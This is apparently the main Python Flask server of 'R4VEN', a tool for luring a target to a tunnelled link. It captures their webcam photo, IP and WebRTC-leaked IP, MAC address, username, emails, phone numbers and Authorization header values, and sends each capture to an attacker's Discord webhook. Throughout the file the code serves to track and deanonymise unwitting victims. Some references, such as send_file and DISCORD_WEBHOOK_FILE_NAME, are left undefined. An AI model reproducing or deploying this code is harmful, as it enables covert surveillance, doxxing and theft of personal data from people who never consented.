import sys
import requests
import os
import socket
import subprocess
import threading
import logging
import argparse
import re
import time
import platform
import json
import io
from datetime import datetime
from flaredantic import FlareTunnel, FlareConfig
from flask import Flask, request, Response, send_from_directory, jsonify
import signal
from utils import get_file_data, update_webhook, check_and_get_webhook_url

# Global flag to handle graceful shutdown
shutdown_flag = threading.Event()

HTML_FILE_NAME = "index.html"

if sys.stdout.isatty():
    R = '\033[31m'  # Red
    G = '\033[32m'  # Green
    C = '\033[36m'  # Cyan
    W = '\033[0m'   # Reset
    Y = '\033[33m'  # Yellow
    M = '\033[35m'  # Magenta
    B = '\033[34m'  # Blue
else:
    R = G = C = W = Y = M = B = ''

app = Flask(__name__)

parser = argparse.ArgumentParser(
    description="R4VEN - Track device location, and IP address, and capture a photo with device details.",
    usage=f"{sys.argv[0]} [-t target] [-p port]"
)
parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
parser.add_argument("-p", "--port", nargs="?", help="port to listen on", type=int, default=8000)
args = parser.parse_args()

def should_exclude_line(line):
    # Add patterns of lines you want to exclude
    exclude_patterns = [
        "HTTP request"
    ]
    return any(pattern in line for pattern in exclude_patterns)

@app.route("/", methods=["GET"])
def get_website():
    html_data = ""
    try:
        html_data = get_file_data(HTML_FILE_NAME)
    except FileNotFoundError:
        pass
    return Response(html_data, content_type="text/html")

@app.route("/dwebhook.js", methods=["GET"])
def get_webhook_js():
    return send_from_directory(directory=os.getcwd(), path=DISCORD_WEBHOOK_FILE_NAME)

@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    discord_webhook = check_and_get_webhook_url(os.getcwd())
    update_webhook(discord_webhook, data)
    return "OK"

@app.route('/image', methods=['POST'])
def image():
    i = request.files['image']
    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
    i.save('%s/%s' % (os.getcwd(), f))
    #print(f"{B}[+] {C}Picture of the target captured and saved")

    webhook_url = check_and_get_webhook_url(os.getcwd())
    files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
    response = requests.post(webhook_url, files=files)

    return Response("%s saved and sent to Discord webhook" % f)

@app.route('/get_target', methods=['GET'])
def get_url():
    return args.target

@app.route('/device_info', methods=['POST'])
def receive_device_info():
    """Receive and process device information with VPN detection"""
    try:
        data = request.get_json()
        
        # Server-side VPN detection
        client_ip = request.remote_addr
        vpn_status = detect_vpn_server_side(client_ip)
        data['serverSideVPNDetection'] = vpn_status
        
        # Compare IPs for discrepancies
        if 'leakedIP' in data.get('vpnDetection', {}):
            data['vpnDetection']['ipMismatch'] = True
            data['vpnDetection']['note'] = "WebRTC leak detected - real IP may be exposed"
        
        logging.info(f"Device Info: {data}")
        
        # Create detailed embed for Discord
        vpn_info = data.get('vpnDetection', {})
        vpn_detected = vpn_info.get('isVPNDetected', False)
        embed_color = 16711680 if vpn_detected else 3447003  # Red if VPN, Green otherwise
        
        fields = [
            {"name": "🔒 VPN Detected", "value": str(vpn_detected), "inline": True},
            {"name": "Public IP", "value": data.get('publicIP', 'N/A'), "inline": True},
            {"name": "Local IP", "value": data.get('localIP', 'N/A'), "inline": True},
            {"name": "Server IP", "value": client_ip, "inline": True},
        ]
        
        # Add WebRTC leak info if present
        if data.get('webrtcLeakIP') and data.get('webrtcLeakIP') != 'N/A':
            fields.append({"name": "WebRTC Leak IP", "value": str(data.get('webrtcLeakIP')), "inline": True})
        
        # Add VPN provider info
        if vpn_detected:
            fields.append({"name": "VPN Provider", "value": vpn_info.get('vpnProvider', 'Unknown'), "inline": True})
            methods = vpn_info.get('methods', [])
            if methods:
                fields.append({"name": "Detection Methods", "value": ", ".join(methods), "inline": False})
        
        # Add device info
        fields.extend([
            {"name": "Platform", "value": data.get('platform', 'N/A'), "inline": True},
            {"name": "MAC Address", "value": data.get('macAddress', 'N/A'), "inline": True},
            {"name": "Network Type", "value": data.get('networkInfo', {}).get('type', 'N/A'), "inline": True},
            {"name": "User Agent", "value": data.get('userAgent', 'N/A')[:100], "inline": False},
            {"name": "Timestamp", "value": data.get('timestamp', 'N/A'), "inline": False}
        ])
        
        embed = {
            "title": "🎯 Device Information Captured",
            "color": embed_color,
            "fields": fields
        }
        
        webhook_data = {
            "username": "R4VEN",
            "embeds": [embed]
        }
        
        # Get webhook and send
        webhook_url = check_and_get_webhook_url(os.getcwd())
        update_webhook(webhook_url, webhook_data)
        
        return jsonify({"status": "success", "message": "Device info received and processed"}), 200
    except Exception as e:
        logging.error(f"Error processing device info: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400

# No-JS Detection Routes
@app.route('/no_js_detector')
def no_js_detector():
    """Detect user without JavaScript using HTTP headers"""
    try:
        device_data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "publicIP": request.remote_addr,
            "userAgent": request.headers.get('User-Agent', 'N/A'),
            "acceptLanguage": request.headers.get('Accept-Language', 'N/A'),
            "jsDisabled": True,
            "detectionMethod": "HTTP Headers (No-JS)"
        }
        
        # Parse User-Agent
        ua_parse = parse_user_agent(device_data['userAgent'])
        device_data.update(ua_parse)
        
        # Send to Discord
        send_device_info_to_discord(device_data)
        
        # Return 1x1 transparent PNG
        return send_file(
            io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'),
            mimetype='image/png'
        )
    except Exception as e:
        logging.error(f"Error in no_js_detector: {e}")
        return "Error", 500

@app.route('/track')
def track_pixel():
    """Track user via image pixel (works without JS)"""
    try:
        device_data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "publicIP": request.remote_addr,
            "userAgent": request.headers.get('User-Agent', 'N/A'),
            "jsDisabled": True,
            "detectionMethod": "Image Pixel Tracking"
        }
        
        # Parse User-Agent
        ua_parse = parse_user_agent(device_data['userAgent'])
        device_data.update(ua_parse)
        
        # Log and send
        logging.info(f"Pixel Track: {device_data}")
        send_device_info_to_discord(device_data)
        
        # Return 1x1 transparent PNG
        return send_file(
            io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'),
            mimetype='image/png'
        )
    except Exception as e:
        logging.error(f"Error in track_pixel: {e}")
        return "Error", 500

@app.route('/collect_info', methods=['POST', 'GET'])
def collect_info():
    """Collect device info via form submission (works without JS)"""
    try:
        device_data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "publicIP": request.remote_addr,
            "userAgent": request.headers.get('User-Agent', 'N/A'),
            "jsDisabled": request.form.get('device_check') == 'no_js',
            "detectionMethod": "Form Submission"
        }
        
        # Parse User-Agent
        ua_parse = parse_user_agent(device_data['userAgent'])
        device_data.update(ua_parse)
        
        logging.info(f"Form Collect: {device_data}")
        send_device_info_to_discord(device_data)
        
        # Redirect back or show success
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logging.error(f"Error in collect_info: {e}")
        return jsonify({"status": "error"}), 400

@app.route('/detect_username', methods=['GET', 'POST'])
def detect_username():
    """Multi-method username detection from device"""
    try:
        device_data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "publicIP": request.remote_addr,
            "userAgent": request.headers.get('User-Agent', ''),
            "username": None,
            "detection_methods": [],
            "detectionType": "Username"
        }
        
        # Method 1: Check HTTP headers for username
        header_list = ['X-Forwarded-User', 'Remote-User', 'X-ProxyUser-Ip', 'From']
        for header in header_list:
            if request.headers.get(header):
                device_data['username'] = request.headers.get(header)
                device_data['detection_methods'].append(f"HTTP Header: {header}")
                break
        
        # Method 2: Extract from referer (Windows file path)
        referer = request.headers.get('Referer', '')
        if referer:
            # Windows file path pattern: file:///C:\Users\username\...
            windows_match = re.search(r'file:///[A-Z]:\\Users\\([^\\]+)\\', referer)
            if windows_match:
                extracted_user = windows_match.group(1)
                device_data['username'] = extracted_user
                device_data['detection_methods'].append("Windows File Path (Referer)")
                device_data['osType'] = "Windows"
            
            # UNC path pattern: \\servername\username\...
            unc_match = re.search(r'\\\\([^\\]+)\\([^\\]+)\\', referer)
            if unc_match:
                extracted_user = unc_match.group(2)
                device_data['username'] = extracted_user
                device_data['detection_methods'].append("UNC Network Path (Referer)")
                device_data['networkServer'] = unc_match.group(1)
            
            # macOS/Linux path pattern: file:///Users/username/...
            unix_match = re.search(r'file:///Users/([^/]+)/', referer)
            if unix_match:
                extracted_user = unix_match.group(1)
                device_data['username'] = extracted_user
                device_data['detection_methods'].append("Unix File Path (Referer)")
                device_data['osType'] = "macOS/Linux"
        
        # Method 3: Check User-Agent for patterns
        ua = device_data['userAgent']
        if '@' in ua:
            email_match = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', ua)
            if email_match:
                email = email_match.group(1)
                device_data['email'] = email
                device_data['username'] = email.split('@')[0]
                device_data['detection_methods'].append("Email in User-Agent")
        
        # Method 4: Try to get hostname and resolve
        try:
            hostname_info = socket.gethostbyaddr(request.remote_addr)
            device_data['hostname'] = hostname_info[0]
            device_data['aliases'] = hostname_info[1]
            device_data['detection_methods'].append("Hostname Resolution")
        except socket.herror:
            logging.debug(f"Could not resolve hostname for {request.remote_addr}")
        except Exception as e:
            logging.debug(f"Hostname resolution error: {e}")
        
        # Parse OS/Browser from User-Agent
        ua_parse = parse_user_agent(device_data['userAgent'])
        device_data.update(ua_parse)
        
        logging.info(f"Username Detection: {device_data}")
        
        # Send to Discord with username emphasis
        send_username_to_discord(device_data)
        
        return jsonify(device_data), 200
    except Exception as e:
        logging.error(f"Error detecting username: {e}")
        return jsonify({"error": str(e), "status": "error"}), 400

@app.route('/detect_contact', methods=['GET', 'POST'])
def detect_contact():
    """Multi-method contact information detection (email & phone)"""
    try:
        contact_data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "publicIP": request.remote_addr,
            "userAgent": request.headers.get('User-Agent', ''),
            "emails": [],
            "phone_numbers": [],
            "detection_methods": [],
            "detectionType": "Contact Info"
        }
        
        # Get all headers as a single searchable string
        all_headers = str(dict(request.headers))
        referer = request.headers.get('Referer', '')
        user_agent = request.headers.get('User-Agent', '')
        
        # Combine all text sources
        searchable_text = f"{all_headers} {referer} {user_agent}"
        
        # Email detection - multiple regex patterns
        email_patterns = [
            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # Standard email
            r'mailto:([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',  # mailto links
        ]
        
        for pattern in email_patterns:
            emails_found = re.findall(pattern, searchable_text)
            for email in emails_found:
                if email not in contact_data['emails']:
                    contact_data['emails'].append(email)
                    if 'Email Extraction' not in contact_data['detection_methods']:
                        contact_data['detection_methods'].append('Email Extraction (Regex)')
        
        # Phone number detection - multiple formats
        phone_patterns = [
            r'\+?1?\s?[-.\(]?(\d{3})[-.\)]?\s?(\d{3})[-.\s]?(\d{4})',  # US format: (123) 456-7890, +1-123-456-7890
            r'\+\d{1,3}\s?\d{1,14}',  # International format: +1234567890
            r'\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b',  # Basic format: 123-456-7890
            r'\(\d{3}\)\s*\d{3}[-.\s]?\d{4}',  # Parentheses format: (123) 456-7890
            r'\+[1-9]\d{1,14}',  # E.164 format
        ]
        
        for pattern in phone_patterns:
            phones_found = re.findall(pattern, searchable_text)
            for phone in phones_found:
                # Convert tuple results to strings and clean up
                if isinstance(phone, tuple):
                    phone_str = ''.join(phone)
                else:
                    phone_str = str(phone)
                
                # Filter out false positives (very short numbers)
                if len(phone_str.replace('-', '').replace('.', '').replace(' ', '').replace('(', '').replace(')', '')) >= 7:
                    if phone_str not in contact_data['phone_numbers']:
                        contact_data['phone_numbers'].append(phone_str)
                        if 'Phone Number Extraction' not in contact_data['detection_methods']:
                            contact_data['detection_methods'].append('Phone Number Extraction (Regex)')
        
        # Check headers specifically
        sensitive_headers = ['Authorization', 'X-Auth-Token', 'X-Email', 'X-Phone', 'X-Contact', 'X-User-Email']
        for header in sensitive_headers:
            value = request.headers.get(header)
            if value:
                contact_data['detection_methods'].append(f'Header Found: {header}')
                # Try to extract email/phone from header value
                if '@' in value:
                    email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', value)
                    if email_match and email_match.group(0) not in contact_data['emails']:
                        contact_data['emails'].append(email_match.group(0))
                
                # Try phone from header
                phone_match = re.search(r'\+?1?\s?[-.\(]?(\d{3})[-.\)]?\s?(\d{3})[-.\s]?(\d{4})', value)
                if phone_match and phone_match.group(0) not in contact_data['phone_numbers']:
                    contact_data['phone_numbers'].append(phone_match.group(0))
        
        # Parse additional info
        ua_parse = parse_user_agent(contact_data['userAgent'])
        contact_data.update(ua_parse)
        
        logging.info(f"Contact Detection: {contact_data}")
        
        # Send to Discord with contact emphasis
        send_contact_info_to_discord(contact_data)
        
        return jsonify(contact_data), 200
    except Exception as e:
        logging.error(f"Error detecting contact info: {e}")
        return jsonify({"error": str(e), "status": "error"}), 400

def detect_vpn_server_side(ip_address):
    """Server-side VPN detection using various methods"""
    vpn_status = {
        "serverIP": ip_address,
        "methods": [],
        "isVPNDetected": False
    }
    
    try:
        # Check for known VPN IP ranges (basic check)
        private_ranges = [
            "10.0.0.0/8",
            "172.16.0.0/12",
            "192.168.0.0/16",
            "127.0.0.1"
        ]
        
        for range_ip in private_ranges:
            if ip_address.startswith(("10.", "172.16.", "172.31.", "192.168.", "127.")):
                vpn_status["methods"].append("Local/Private IP Detected")
                break
        
        # Try to get IP geolocation for validation
        try:
            geo_response = requests.get(f"https://ipapi.co/{ip_address}/json/", timeout=3)
            if geo_response.status_code == 200:
                geo_data = geo_response.json()
                vpn_status["isp"] = geo_data.get("org", "Unknown")
                vpn_status["country"] = geo_data.get("country_name", "Unknown")
                vpn_status["city"] = geo_data.get("city", "Unknown")
                
                # Check for VPN indicators in ISP name
                vpn_keywords = ["vpn", "proxy", "tor", "anonymous", "hosting", "server"]
                isp_lower = geo_data.get("org", "").lower()
                if any(keyword in isp_lower for keyword in vpn_keywords):
                    vpn_status["isVPNDetected"] = True
                    vpn_status["methods"].append("VPN ISP Detection")
        except:
            pass
        
    except Exception as e:
        logging.error(f"Error in server-side VPN detection: {e}")
    
    return vpn_status

def run_flask(folder_name):
    try:
        os.chdir(folder_name)
    except FileNotFoundError:
        print(f"{R}Error: Folder '{folder_name}' does not exist.{W}")
        sys.exit(1)

    # Start Flask in a separate thread
    flask_thread = threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": args.port, "debug": False})
    flask_thread.daemon = True
    flask_thread.start()

    # Keep the main thread running to monitor the shutdown flag
    try:
        while not shutdown_flag.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"{R}Flask server terminated.{W}")
        shutdown_flag.set()

def signal_handler(sig, frame):
    """Handles termination signals like CTRL+C."""
    print(f"{R}Exiting...{W}")
    shutdown_flag.set()  # Set the shutdown flag to terminate threads
    sys.exit(0)

# Attach signal handler for CTRL+C
signal.signal(signal.SIGINT, signal_handler)

# Cloudflare tunnel with non-blocking handling
def run_tunnel():
    try:
        config = FlareConfig(
            port=args.port,
            verbose=True  # Enable logging for debugging
        )
        with FlareTunnel(config) as tunnel:
            print(f"{G}[+] Flask app available at: {C}{tunnel.tunnel_url}{W}")
            
            # Keep the main thread running to monitor the shutdown flag
            while not shutdown_flag.is_set():
                time.sleep(0.5)
    except Exception as e:
        logging.error(f"Error in Cloudflare tunnel: {e}")
        print(f"{R}Error: {e}{W}")

# Serveo
def start_port_forwarding():
    try:
        command = ["ssh", "-R", f"80:localhost:{args.port}", "serveo.net"]
        logging.info("Starting port forwarding with command: %s", " ".join(command))
        
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        url_printed = False
        for line in process.stdout:
            line = line.strip()
            if line:
                if "Forwarding HTTP traffic from" in line and not url_printed:
                    url = line.split(' ')[-1]
                    formatted_url_message = (
                        f"\n{M}[+] {C}Send This URL To Target: {G}{url}{W}\n {R}Don't close this window!{W}")
                    print(formatted_url_message)
                    logging.info(formatted_url_message)
                    url_printed = True
                elif not should_exclude_line(line):
                    logging.info(line)
                    print(line)
        
        for line in process.stderr:
            line = line.strip()
            if line:
                if not should_exclude_line(line):
                    logging.error(line)
                    print(line)

    except Exception as e:
        print(f"An error occurred while using Serveo: {e}", "error")

# Function to check if Serveo is up
def is_serveo_up():
    print(f"\n{B}[?] {C}Checking if {Y}Serveo.net{W} is up for port forwarding...{W}", end="", flush=True)
    try:
        response = requests.get("https://serveo.net", timeout=3)
        if response.status_code == 200:
            print(f" {G}[UP]{W}")
            return True
    except requests.RequestException:
        pass
    print(f" {R}[DOWN]{W}")
    return False

# User choice
def ask_port_forwarding():
    serveo_status = "Site is Up" if is_serveo_up() else "Down! Currently not working"
    print(f'____________________________________________________________________________\n')
    print(f"{B}[~] {C}Choose port forwarding?{W}\n")
    print(f"{Y}1. {W}serveo ({R}{serveo_status}{W})")
    print(f"{Y}2. {W}cloudflare {G}(recommended)")
    print(f"{Y}3. {W}None, I will use another method")
    print(f"\n{M}Note:{R} If 1,2 does not work..{W}Use option {G}3{W} and port forward manually using tool like Ngrok\n")
    choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
    return choice

#print(f"\n{B}[?] {C}Checking if {port} is available...{W}", end="", flush=True)

# Port check
def is_port_available(port):
    """
    Check if a port is available.
    """
    print(f"{B}[?] {C}Checking if port {Y}{port}{W} is available...{W}", end="", flush=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        if sock.connect_ex(("127.0.0.1", port)) != 0:
            print(f" {G}[AVAILABLE]{W}")
            return True
        else:
            print(f" {R}[IN USE]{W}")
            return False

# Helper functions for no-JS detection
def parse_user_agent(ua_string):
    """Parse User-Agent for OS and browser info"""
    info = {
        "browser": "Unknown",
        "os": "Unknown"
    }
    
    if 'Windows' in ua_string:
        info["os"] = "Windows"
    elif 'Mac' in ua_string:
        info["os"] = "macOS"
    elif 'Linux' in ua_string:
        info["os"] = "Linux"
    elif 'Android' in ua_string:
        info["os"] = "Android"
    elif 'iPhone' in ua_string or 'iPad' in ua_string:
        info["os"] = "iOS"
    
    if 'Chrome' in ua_string and 'Edg' not in ua_string:
        info["browser"] = "Chrome"
    elif 'Firefox' in ua_string:
        info["browser"] = "Firefox"
    elif 'Safari' in ua_string and 'Chrome' not in ua_string:
        info["browser"] = "Safari"
    elif 'Edg' in ua_string:
        info["browser"] = "Edge"
    
    return info

def send_device_info_to_discord(device_data):
    """Send device info to Discord webhook"""
    try:
        webhook_url = check_and_get_webhook_url(os.getcwd())
        
        embed = {
            "title": "🎯 Device Detected (No-JS Method)" if device_data.get('jsDisabled') else "🎯 Device Detected",
            "color": 16776960 if device_data.get('jsDisabled') else 3447003,  # Yellow if no-JS, Green otherwise
            "fields": [
                {"name": "IP Address", "value": device_data.get('publicIP', 'N/A'), "inline": True},
                {"name": "Browser", "value": device_data.get('browser', 'N/A'), "inline": True},
                {"name": "OS", "value": device_data.get('os', 'N/A'), "inline": True},
                {"name": "User Agent", "value": device_data.get('userAgent', 'N/A')[:100], "inline": False},
                {"name": "Detection Method", "value": device_data.get('detectionMethod', 'Unknown'), "inline": True},
                {"name": "JS Status", "value": "Disabled ⚠️" if device_data.get('jsDisabled') else "Enabled ✓", "inline": True},
                {"name": "Timestamp", "value": device_data.get('timestamp', 'N/A'), "inline": False}
            ]
        }
        
        webhook_data = {
            "username": "R4VEN",
            "embeds": [embed]
        }
        
        update_webhook(webhook_url, webhook_data)
        logging.info(f"Device info sent to Discord: {device_data}")
    except Exception as e:
        logging.error(f"Error sending to Discord: {e}")

def send_username_to_discord(device_data):
    """Send username detection info to Discord webhook with emphasis"""
    try:
        webhook_url = check_and_get_webhook_url(os.getcwd())
        
        # Build fields
        fields = [
            {"name": "👤 Username", "value": device_data.get('username', 'N/A'), "inline": True},
            {"name": "IP Address", "value": device_data.get('publicIP', 'N/A'), "inline": True},
            {"name": "Hostname", "value": device_data.get('hostname', 'N/A'), "inline": True},
        ]
        
        # Add email if found
        if device_data.get('email'):
            fields.append({"name": "📧 Email", "value": device_data.get('email'), "inline": True})
        
        # Add OS info
        fields.extend([
            {"name": "OS", "value": device_data.get('os', 'N/A'), "inline": True},
            {"name": "Browser", "value": device_data.get('browser', 'N/A'), "inline": True},
        ])
        
        # Add detection methods
        methods = device_data.get('detection_methods', [])
        if methods:
            fields.append({"name": "🔍 Detection Methods", "value": ", ".join(methods), "inline": False})
        
        # Add network server if UNC path
        if device_data.get('networkServer'):
            fields.append({"name": "🖥️ Network Server", "value": device_data.get('networkServer'), "inline": True})
        
        fields.extend([
            {"name": "User Agent", "value": device_data.get('userAgent', 'N/A')[:100], "inline": False},
            {"name": "Timestamp", "value": device_data.get('timestamp', 'N/A'), "inline": False}
        ])
        
        # Use different color if username found
        embed_color = 16711680 if device_data.get('username') else 16776960  # Red if found, Yellow if not
        
        embed = {
            "title": "🎯 Username Detected!" if device_data.get('username') else "⚠️ Username Detection Attempt",
            "color": embed_color,
            "fields": fields
        }
        
        webhook_data = {
            "username": "R4VEN",
            "avatar_url": "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
            "content": f"@everyone New username detection: **{device_data.get('username', 'Unknown')}**" if device_data.get('username') else None,
            "embeds": [embed]
        }
        
        update_webhook(webhook_url, webhook_data)
        logging.info(f"Username detection sent to Discord: {device_data}")
    except Exception as e:
        logging.error(f"Error sending username to Discord: {e}")

def send_contact_info_to_discord(contact_data):
    """Send contact information (email & phone) to Discord webhook with emphasis"""
    try:
        webhook_url = check_and_get_webhook_url(os.getcwd())
        
        # Build fields
        fields = [
            {"name": "IP Address", "value": contact_data.get('publicIP', 'N/A'), "inline": True},
            {"name": "OS", "value": contact_data.get('os', 'N/A'), "inline": True},
            {"name": "Browser", "value": contact_data.get('browser', 'N/A'), "inline": True},
        ]
        
        # Add emails with emphasis
        emails = contact_data.get('emails', [])
        if emails:
            email_list = '\n'.join([f"✉️ {email}" for email in emails])
            fields.append({"name": "📧 Emails Found", "value": email_list, "inline": False})
        else:
            fields.append({"name": "📧 Emails Found", "value": "None", "inline": False})
        
        # Add phone numbers with emphasis
        phones = contact_data.get('phone_numbers', [])
        if phones:
            phone_list = '\n'.join([f"📱 {phone}" for phone in phones])
            fields.append({"name": "📞 Phone Numbers Found", "value": phone_list, "inline": False})
        else:
            fields.append({"name": "📞 Phone Numbers Found", "value": "None", "inline": False})
        
        # Add detection methods
        methods = contact_data.get('detection_methods', [])
        if methods:
            fields.append({"name": "🔍 Detection Methods", "value": ", ".join(methods), "inline": False})
        
        # Add user agent
        fields.extend([
            {"name": "User Agent", "value": contact_data.get('userAgent', 'N/A')[:100], "inline": False},
            {"name": "Timestamp", "value": contact_data.get('timestamp', 'N/A'), "inline": False}
        ])
        
        # Use different color based on what was found
        if emails or phones:
            embed_color = 16711680  # Red if contact found
            title = "🎯 CONTACT INFO DETECTED!"
            content = "@everyone "
            if emails:
                content += f"**Emails Found: {', '.join(emails)}** "
            if phones:
                content += f"**Phone Numbers: {', '.join(phones)}**"
        else:
            embed_color = 16776960  # Yellow if nothing found
            title = "⚠️ Contact Detection Attempt"
            content = None
        
        embed = {
            "title": title,
            "color": embed_color,
            "fields": fields
        }
        
        webhook_data = {
            "username": "R4VEN",
            "avatar_url": "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
            "content": content,
            "embeds": [embed]
        }
        
        update_webhook(webhook_url, webhook_data)
        logging.info(f"Contact info sent to Discord: {contact_data}")
    except Exception as e:
        logging.error(f"Error sending contact info to Discord: {e}")
